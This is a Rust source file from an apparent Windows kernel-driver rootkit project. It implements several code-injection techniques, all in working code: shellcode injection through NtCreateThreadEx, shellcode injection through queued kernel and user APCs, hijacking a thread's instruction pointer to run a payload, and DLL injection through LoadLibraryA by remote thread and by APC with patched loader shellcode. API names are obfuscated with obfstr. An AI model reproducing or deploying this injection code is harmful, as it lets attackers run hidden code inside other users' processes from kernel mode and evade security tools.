use obfstr::obfstr as s;
use core::{
    ffi::c_void, 
    mem::transmute, 
    ptr::null_mut
};
use wdk_sys::{
    ntddk::*, *,
    _MODE::{KernelMode, UserMode},
};

use crate::{
    *, 
    file::read_file, 
    error::ShadowError,
    patterns::{
        find_zw_function, 
        LDR_SHELLCODE
    }, 
};
use crate::{
    attach::ProcessAttach, 
    handle::Handle, 
    pool::PoolMemory
};
use crate::{
    address::get_module_base_address,
    data::KAPC_ENVIROMENT::OriginalApcEnvironment, 
};

/// Represents shellcode injection operations.
pub struct Shellcode;

impl Shellcode {
    /// Injects shellcode into a target process using `ZwCreateThreadEx`.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process where the shellcode will be injected.
    /// * `path` - The file path to the shellcode to be injected, which will be read into memory.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the injection is successful.
    /// * `Err(ShadowError)` - If any step fails.
    pub unsafe fn thread(pid: usize, path: &str) -> Result<NTSTATUS> {
        // Find the address of NtCreateThreadEx to create a thread in the target process
        let zw_thread_addr = find_zw_function(s!("NtCreateThreadEx"))? as *mut c_void;

        // Retrieve the EPROCESS structure for the target process
        let target_eprocess = Process::new(pid)?;

        // Open the target process with all access rights
        let mut client_id = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: null_mut() };
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
        }

        // Wrap the process handle in a safe Handle type
        let h_process = Handle::new(h_process);

        // Read the shellcode from the provided file path
        let shellcode = read_file(path)?;

        // Allocate memory in the target process for the shellcode
        let mut region_size = shellcode.len() as u64;
        let mut base_address = null_mut();
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
        }

        // Copy the shellcode into the allocated memory in the target process
        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr().cast_mut().cast(),
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );

        // Change the memory protection to allow execution of the shellcode
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(h_process.get(), &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwProtectVirtualMemory", status));
        }

        // Create a thread in the target process to execute the shellcode
        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process.get(),
            base_address,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwCreateThreadEx", status));
        }

        // Close the thread handle after creation
        ZwClose(h_thread);
        Ok(status)
    }

    /// Injects shellcode into a target process using Asynchronous Procedure Call (APC).
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process where the shellcode will be injected.
    /// * `path` - The file path to the shellcode that will be injected into the target process.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the injection is successful.
    /// * `Err(ShadowError)` - If any step fails.
    pub unsafe fn apc(pid: usize, path: &str) -> Result<NTSTATUS> {
        // Read the shellcode from the provided file path
        let shellcode = read_file(path)?;

        // Find an alertable thread in the target process
        let tid = find_thread_alertable(pid)?;

        // Open the target process
        let target_eprocess = Process::new(pid)?;
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: null_mut() };
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
        }

        // Wrap the process handle in a safe Handle type
        let h_process = Handle::new(h_process);

        // Allocate memory in the target process for the shellcode
        let mut base_address = null_mut();
        let mut region_size = shellcode.len() as u64;
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
        }

        // Copy the shellcode into the target process's memory
        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr().cast_mut().cast(),
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );

        // Change the memory protection to allow execution of the shellcode
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(
            h_process.get(),
            &mut base_address,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwProtectVirtualMemory", status));
        }

        // Allocate memory for kernel and user APC objects
        let user_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "krts")
            .map(|mem: PoolMemory| {
                let ptr = mem.ptr as *mut _KAPC;
                core::mem::forget(mem);
                ptr
            })
            .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;

        let kernel_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "urds")
            .map(|mem: PoolMemory| {
                let ptr = mem.ptr as *mut _KAPC;
                core::mem::forget(mem);
                ptr
            })
            .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;

        // Initialize the kernel APC
        KeInitializeApc(
            kernel_apc,
            tid,
            OriginalApcEnvironment,
            kernel_apc_callback,
            None,
            None,
            KernelMode as i8,
            null_mut(),
        );

        // Initialize the user APC with the shellcode
        KeInitializeApc(
            user_apc,
            tid,
            OriginalApcEnvironment,
            user_apc_callback,
            None,
            transmute(base_address),
            UserMode as i8,
            null_mut(),
        );

        // Insert the user APC into the queue
        if !KeInsertQueueApc(user_apc, null_mut(), null_mut(), 0) {
            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()));
        }

        // Insert the kernel APC into the queue
        if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()));
        }

        Ok(status)
    }

    /// Modifies the execution context of a target thread to inject and execute a payload.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process where the shellcode will be injected.
    /// * `path` - The file path to the shellcode that will be injected into the target process.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the injection is successful.
    /// * `Err(ShadowError)` - If any step  fails.
    pub unsafe fn thread_hijacking(pid: usize, path: &str) -> Result<NTSTATUS> {
        // Retrieve the process handle from the given PID
        let process = Process::new(pid)?;
        let thread = find_thread(pid)?;
        let buffer = read_file(path)?;

        // Locate the base address of the kernel module
        let ntoskrnl = get_module_base_address("ntoskrnl.exe")?;

        // Suspend the target process to ensure a stable environment
        PsSuspendProcess(process.e_process);

        // Attach to the target process for memory manipulation
        let mut attach = ProcessAttach::new(process.e_process);

        // Allocate memory in the target process for the payload
        let mut base_address = null_mut();
        let mut region_size = buffer.len() as u64;
        let mut status = ZwAllocateVirtualMemory(-1isize as HANDLE, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
        }

        // Copy the payload (BUFFER) into the allocated memory in the target process
        core::ptr::copy_nonoverlapping(buffer.as_ptr(), base_address.cast(), region_size as usize);

        // Allocate memory for the CONTEXT structure in the target process
        let mut context_addr = null_mut();
        status = ZwAllocateVirtualMemory(-1isize as HANDLE, &mut context_addr, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory [2]", status));
        }

        // Interpret the allocated memory as a pointer to a CONTEXT structure
        let context = context_addr as *mut CONTEXT;

        // Initialize the CONTEXT structure with flags to capture full register state
        (*context).ContextFlags = CONTEXT_FULL;

        // Get the current context of the target thread
        status = PsGetContextThread(thread, context, UserMode as i8);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("PsGetContextThread", status));
        }

        // Set the instruction pointer (Rip) to the address of the payload
        (*context).Rip = base_address as u64;

        // Update the thread's context with the modified CONTEXT structure
        status = PsSetContextThread(thread, context, UserMode as i8);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("PsSetContextThread", status));
        }

        // Detach from the target process, finalizing modifications
        attach.detach();

        // Resume the process, allowing it to execute the modified context
        let status = PsResumeProcess(process.e_process);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("PsResumeProcess", status));
        }

        Ok(status)
    }
}

/// Represents dll injection operations.
pub struct DLL;

impl DLL {
    /// Injects a DLL into a target process by creating a remote thread that calls `LoadLibraryA`.
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process where the DLL will be injected.
    /// * `path` - The file path to the DLL that will be injected.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the injection is successful.
    /// * `Err(ShadowError)` - If any step fails.
    pub unsafe fn thread(pid: usize, path: &str) -> Result<NTSTATUS> {
        // Find the address of NtCreateThreadEx to create a thread in the target process
        let zw_thread_addr = find_zw_function(s!("NtCreateThreadEx"))?;

        // Find the address of LoadLibraryA in kernel32.dll
        let load_library = get_function_peb(pid, s!("kernel32.dll"), s!("LoadLibraryA"))?;

        // Open the target process
        let mut h_process = null_mut();
        let target_eprocess = Process::new(pid)?;
        let mut client_id = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: null_mut() };
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
        }

        // Wrap the process handle in a safe Handle type
        let h_process = Handle::new(h_process);

        // Allocate memory in the target process for the DLL path
        let mut base_address = null_mut();
        let mut region_size = (path.len() * size_of::<u16>()) as u64;
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
        }

        // Copy the DLL path into the target process's memory
        let mut return_size = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            path.as_ptr().cast_mut().cast(),
            target_eprocess.e_process,
            base_address,
            region_size,
            KernelMode as i8,
            &mut return_size,
        );

        // Change the memory protection to executabl
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(
            h_process.get(),
            &mut base_address,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );
        
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwProtectVirtualMemory", status));
        }

        // Create a thread in the target process to load the DLL
        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process.get(),
            load_library,
            base_address,
            0,
            0,
            0,
            0,
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwCreateThreadEx", status));
        }

        // Close the handle to the thread
        ZwClose(h_thread);

        Ok(status)
    }

    /// DLL Injection into a target process using Asynchronous Procedure Call (APC).
    ///
    /// # Arguments
    ///
    /// * `pid` - The process identifier (PID) of the target process where the DLL will be injected.
    /// * `path` - The file path to the DLL that will be injected into the target process.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - If the injection is successful.
    /// * `Err(ShadowError)` - If any step fails.
    pub unsafe fn apc(pid: usize, path: &str) -> Result<NTSTATUS> {         
        // Find an alertable thread in the target process
        let tid = find_thread_alertable(pid)?;

        // Find the address of LoadLibraryA in kernel32.dll
        let load_library = get_function_peb(pid, s!("kernel32.dll"), s!("LoadLibraryA"))?;

        // Open the target process
        let mut h_process = null_mut();
        let target_eprocess = Process::new(pid)?;
        let mut client_id = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: null_mut() };
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwOpenProcess", status));
        }

        // Wrap the process handle in a safe Handle type
        let h_process = Handle::new(h_process);

        // Allocate memory in the target process for the DLL path
        let mut base_address = null_mut();
        let mut region_size = (path.len() * size_of::<u16>()) as u64;
        status = ZwAllocateVirtualMemory(h_process.get(), &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory", status));
        }

        // Copy the DLL path into the target process's memory
        let mut return_size = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            path.as_ptr().cast_mut().cast(),
            target_eprocess.e_process,
            base_address,
            region_size,
            KernelMode as i8,
            &mut return_size,
        );

        // Allocate memory in the target process for the DLL path
        let mut shellcode_address = null_mut();
        let mut shellcode_size = LDR_SHELLCODE.len() as u64;
        status = ZwAllocateVirtualMemory(h_process.get(), &mut shellcode_address, 0, &mut shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ZwAllocateVirtualMemory [2]", status));
        }

        LDR_SHELLCODE[6..14].copy_from_slice(&(load_library as usize).to_le_bytes());
        LDR_SHELLCODE[16..24].copy_from_slice(&(base_address as usize).to_le_bytes());

        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            LDR_SHELLCODE.as_ptr().cast_mut().cast(),
            target_eprocess.e_process,
            shellcode_address,
            shellcode_size,
            KernelMode as i8,
            &mut return_size,
        );

        // Allocate memory for kernel and user APC objects
        let user_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "krts")
            .map(|mem: PoolMemory| {
                let ptr = mem.ptr as *mut _KAPC;
                core::mem::forget(mem);
                ptr
            })
            .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;

        let kernel_apc = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, "urds")
            .map(|mem: PoolMemory| {
                let ptr = mem.ptr as *mut _KAPC;
                core::mem::forget(mem);
                ptr
            })
            .ok_or(ShadowError::FunctionExecutionFailed("PoolMemory", line!()))?;

        // Initialize the kernel APC
        KeInitializeApc(
            kernel_apc,
            tid,
            OriginalApcEnvironment,
            kernel_apc_callback,
            None,
            None,
            KernelMode as i8,
            null_mut(),
        );

        // Initialize the user APC with the shellcode
        KeInitializeApc(
            user_apc,
            tid,
            OriginalApcEnvironment,
            user_apc_callback,
            None,
            transmute(shellcode_address),
            UserMode as i8,
            null_mut(),
        );

        // Insert the user APC into the queue
        if !KeInsertQueueApc(user_apc, null_mut(), null_mut(), 0) {
            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()));
        }

        // Insert the kernel APC into the queue
        if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
            return Err(ShadowError::FunctionExecutionFailed("KeInsertQueueApc", line!()));
        }

        Ok(STATUS_SUCCESS)
    }
}

/// Kernel APC callback function.
///
/// This callback is triggered when the kernel APC is executed.
/// It ensures that the thread is alertable and then frees the allocated APC structure.
unsafe extern "system" 
fn kernel_apc_callback(
    apc: PKAPC,
    _normal_routine: *mut PKNORMAL_ROUTINE,
    _normal_context: *mut PVOID,
    _system_argument1: *mut PVOID,
    _system_argument2: *mut PVOID,
) {
    // Ensure the thread is alertable in user mode
    KeTestAlertThread(UserMode as i8);

    // Free the APC object
    ExFreePool(apc.cast())
}

/// User APC callback function.
///
/// This callback is triggered when the user APC is executed.
/// It checks if the thread is terminating and frees the APC structure when done.
unsafe extern "system" 
fn user_apc_callback(
    apc: PKAPC,
    normal_routine: *mut PKNORMAL_ROUTINE,
    _normal_context: *mut PVOID,
    _system_argument1: *mut PVOID,
    _system_argument2: *mut PVOID,
) {
    // Check if the current thread is terminating and prevent the shellcode from executing
    if PsIsThreadTerminating(PsGetCurrentThread()) == 1 {
        *normal_routine = None;
    }

    // Free the APC object
    ExFreePool(apc.cast())
}
